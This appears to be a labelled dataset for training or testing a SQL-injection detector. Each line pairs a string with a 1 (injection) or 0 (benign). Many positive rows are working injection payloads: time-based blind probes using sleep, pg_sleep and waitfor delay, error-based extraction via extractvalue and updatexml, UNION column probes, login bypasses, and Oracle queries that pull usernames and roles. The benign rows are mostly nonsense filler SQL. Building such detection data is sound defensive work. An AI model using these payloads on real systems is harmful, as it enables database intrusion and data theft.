-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ';1
SELECT * FROM forward WHERE bark = 'express';0
1%' or sleep  (  5  )   and '%'  =  ';1
union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --;1
' or sleep(5)#;1
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --;1
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ;0
"UPDATE inventory SET description = '2023-01-01' WHERE created_at = 'user123';";0
SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card;0
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh";1
"UPDATE orders SET created_at = 'active' WHERE status = 'user123';";0
"SELECT id FROM orders WHERE status = 123;";0
1'+  (  select 'feof' where 1966  =  1966;1
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""bzzt"" like ""bzzt";1
SELECT pencil, mighty+ ', ' + sudden+ ' ' + might+ ', ' + tape AS during  FROM him;0
or 'text'   =   n'text';1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq";1
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""";0
SELECT AVG ( lower )  FROM lunch  SELECT SUM ( time ) ;0
SELECT * FROM idea WHERE NOT hole = 'who'  AND NOT movement = 'author';0
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY;0
conciliador;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--;1
"SELECT id FROM orders WHERE quantity = 'pending';";0
SELECT * FROM water ORDER BY service;0
SELECT * FROM dirty WHERE those NOT BETWEEN 'sound' AND 'grown';0
"-7016%""   )    )    union all select 8847,8847,8847--";1
SELECT AVG ( feel ) FROM lion;0
SELECT Orders.keyrID, Employees.smile, Employees.managed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.bridgeID ORDER BY Orders.airplaneID;0
virge;0
1  )   as udjn where 6871  =  6871 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1";1
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ;0
1  )   as lisg where 5490  =  5490;1
21388;0
1'  )   where 8204  =  8204;1
62;0
`	    Backtick;1
"1%""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""%""  =  """;1
-4811%'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ';1
"-3628"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ";1
SELECT storm ( s )  FROM hung;0
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1";1
1'  )   where 7537  =  7537 and 2006  =  2006;1
SELECT * FROM explanation WHERE stronger BETWEEN earn09/01/1996folks AND powder15/31/1996flies;0
"UPDATE logs SET quantity = 'Sample text' WHERE user_id = 456;";0
alfama;0
SELECT COUNT ( muscle )  FROM pupil;0
"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--";1
"SELECT * FROM differ WHERE signal BETWEEN ""living"" AND    ""arrangement""";0
1'+  (  select qdon where 9453  =  9453;1
select * from users where id  =  1 +$+ or 1  =  1 -- 1;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#;1
SELECT * FROM advice WHERE curve IN  ( SELECT mice FROM though ) ;0
SELECT * FROM expect WHERE too IN  ( SELECT cheese FROM save ) ;0
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #;1
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1";1
"SELECT id, price, status FROM customers WHERE name = 'active';";0
darcange1;0
SELECT * FROM bound WHERE magnet = 'nearly' FETCH FIRST 3 ROWS ONLY;0
)    )    or    (    (   'x'   )    )     =     (    (   'x;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i;1
SLEEP(5)--;1
1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT * FROM actually WHERE to NOT LIKE '[life]%';0
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#";1
SELECT * FROM stone WHERE mile = 'pound' FETCH FIRST 3 ROWS ONLY;0
if  (  8537  =  7034  )   select 8537 else drop function vqmp--;1
select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #;1
linton;0
1'||  (  select 'sxya' where 3578  =  3578;1
SELECT * FROM blow ORDER BY cattle;0
SELECT COUNT ( womenID ) FROM merely;0
SELECT yesterday ( s FROM plain RIGHT JOIN;0
-8023' or 6872  =  6872;1
--;1
SELECT * FROM  ( SELECT fur FROM stared ) ;0
SELECT building ( s )  FROM eaten SELECT write ( s ) ;0
SELECT * FROM dirty WHERE those NOT BETWEEN 'sound' AND 'grown';0
UPDATE breakfast SET science = 'strong'WHERE finish = 'main';0
"1""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""sjiz"" like ""sjiz";1
c/ virgen de la paloma, 107;0
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#";1
1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  ';1
replace;1
SELECT strong, planned, massFROM trip WHERE paper  IS NOT NULL;0
SELECT * FROM clothes WHERE proud = 'third'  AND  ( knowledge = 'thread' OR recognize = 'rocket' ) ;0
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei";1
rains8;0
1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
7447;0
subidor;0
or 0  =  0 --;1
SELECT * FROM hurt ORDER BY bound, ride;0
"SELECT email, price, user_id FROM products WHERE price = 'active';";0
86704903d;0
1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf;1
carrera;0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo";1
UPDATE exercise SET arm = 'location'WHERE stove = 'organized';0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1';1
dotan;0
1oca;0
SELECT * FROM cold WHERE Price NOT BETWEEN 10 AND 20;0
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv";1
smoot;0
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference';0
geria;0
SELECT Count ( * )  AS army;0
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY;0
-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--;1
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq;1
SELECT screen ( s )  FROM grandmother LEFT JOIN;0
1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --;1
"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --";1
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT MIN ( square )  AS freedom FROM memory;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#;1
c/ venus 91, 1e;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk;1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1";1
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""xqgt"" like ""xqgt";1
SELECT say ( s )  FROM camera FULL OUTER JOIN;0
embo4ina80;0
"admin"" or 1=1#";1
SELECT * FROM continued ORDER BY zipper ASC, swam DESC;0
pg_sleep  (  __TIME__  )  --;1
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix";1
-7845' union all select 9574,9574,9574,9574,9574,9574#;1
SELECT column_name ( s )  FROM individual,moon;0
1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--;1
-6155%'   )    )    union all select 2421,2421,2421,2421,2421#;1
SELECT powder,new,best,such,live     (  (  wrapped JOIN being ON only.tiny =  copy.noise )   INNER JOIN shownON Orders.perfectly =  satisfied.streetID ) ;0
SELECT TOP 3 * FROM managed SELECT * FROM upon 3SELECT * FROM down;0
SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  ;0
SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight;0
43470;0
1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT TOP 3 * FROM buried SELECT * FROM waste 3SELECT * FROM railroad;0
-7610' or 3038  =  3038;1
SELECT determine ( s ) FROM excitement INNER JOIN;0
SELECT DISTINCT year FROM ground;0
SELECT * FROM  ( SELECT right FROM world ) ;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10;1
" select * from users where id  =  1 or "",&"" or 1  =  1 -- 1";1
select case when 1574  =  5523 then 1 else null end--;1
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1";1
SELECT * FROM eventually WHERE evidence LIKE '%highway%';0
select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1;1
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
SELECT * FROM  ( SELECT tight FROM leader ) ;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13;1
select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #;1
SELECT AVG ( mountain ) FROM science SELECT SUM ( visit ) ;0
"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni";1
SELECT TOP 3 * FROM each WHERE blind = 'ought' SELECT * FROM merely;0
bordagorry;0
SELECT replace ( s )  FROM cause;0
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND    ""asleep""";0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21;1
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288;1
joffe;0
3313;0
SELECT * FROM earn;0
SELECT * FROM brain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM shadow;0
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss;1
1 where 6223  =  6223 rlike sleep  (  5  )  #;1
SELECT * FROM exercise WHERE raise = 'fact'  OR start = 'slip';0
1%'   )    )     )   waitfor delay '0:0:5' and    (    (     (  '%'  =  ';1
SELECT * FROM beat;0
select * from users where id  =  1 union select 1 1a,version  (    )   -- 1;1
SELECT facing FROM when;0
SELECT * FROM gold WHERE arrow = 'universe'  OR wheel = 'lying';0
-3921'  )   as audo where 7087  =  7087 or 1755  =  4937--;1
SELECT TOP 3 * FROM thrown SELECT * FROM became 3SELECT * FROM little;0
1'  )   where 6622  =  6622 order by 1--;1
17154;0
SELECT * FROM increase WHERE discovery LIKE '%make%';0
SELECT * FROM dish WHERE west IN  ( SELECT army FROM laugh ) ;0
SELECT COUNT ( union ) FROM these;0
"1%"" union all select null,null,null,null,null,null,null#";1
"1%""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""%""  =  """;1
gattas;0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  ';1
1'   )    )     )   and 3602  =  1990#;1
SELECT drew;0
7,20E+15;0
1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--;1
1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl;1
SELECT * FROM breeze WHERE accept = 'pet'  OR out = 'gave';0
1   )    )    as xcsm where 9231  =  9231;1
paisaje;0
-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --;1
UNION ALL SELECT 1,2,3#;1
1   )    )     )   union all select null,null,null,null,null,null,null,null--;1
SELECT Orders.canalrID, Employees.pitch, Employees.slightly FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.elseID ORDER BY Orders.promisedID;0
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i;1
SELECT * FROM  ( SELECT while FROM kids ) ;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#;1
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#";1
&';1
"SELECT description, price, email FROM inventory WHERE user_id = 'pending';";0
-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#;1
"UPDATE customers SET price = '2023-01-01' WHERE email = '2023-01-01';";0
SELECT * FROM tongue WHERE left = 'father' LIMIT 3;0
SELECT sail ( s FROM little RIGHT JOIN;0
SELECT * FROM was WHERE element NOT IN  ( 'per', 'include', 'planning' )  ;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--;1
waitfor delay '0:0:5' and 'dfzn'  =  'dfzn;1
select case when 2599  =  7035 then 1 else null end--;1
1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'qtni'  =  'qtni;1
des7768ab9e6os;0
SELECT * FROM mouth FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT locate,suit,material,nearer,fall     (  (  or JOIN halfway ON signal.image =  am.write )   INNER JOIN favoriteON Orders.is =  these.thinkID ) ;0
SELECT * FROM rain WHERE movement = 'garden' FETCH FIRST 3 ROWS ONLY;0
SELECT * FROM gently  WHERE relationship NOT LIKE '[steep]%';0
select * from users where id  =  1 or .<1 union select 1,@@VERSION -- 1;1
1  )   as lisg where 5490  =  5490;1
"UPDATE orders SET price = 'pending' WHERE name = 'user123';";0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--;1
(  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#;1
"SELECT user_id, status, quantity, description FROM sessions WHERE quantity = 'user123';";0
37ce;0
castell sargatal;0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd;1
SELECT Employees.adjective, COUNT ( Orders.oceanID )  AS guessFROM    ( OrdersINNER JOIN join ON Orders.deathID  =  Employees.snowID ) ;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i;1
1%'  )   union all select null,null,null,null,null,null,null--;1
SELECT * FROM gift WHERE NOT moment = 'apart'  AND NOT which = 'path';0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17;1
1  )   as nmlm where 9872  =  9872;1
"UPDATE logs SET quantity = 'user123' WHERE price = 'user123';";0
"admin"" or ""1""=""1""/*";1
SELECT * FROM they WHERE got = 'private';0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4;1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt;1
"1%""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""%""  =  """;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--;1
c/ mijancas, 154 3?c;0
"UPDATE logs SET name = 'Sample text' WHERE name = 'user123';";0
SELECT * FROM one FETCH FIRST 3 ROWS ONLY;0
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#";1
bayliss;0
SELECT * FROM  ( SELECT life FROM probably ) ;0
"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa";1
SELECT COUNT ( DISTINCT cover )  FROM run;0
"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #";1
SELECT * FROM printed WHERE halfway BETWEEN 'degree' AND 'blew';0
UNION ALL SELECT 1,2,3,4,5,6,7#;1
SELECT ourID AS ID, knife AS plenty FROM close;0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj;1
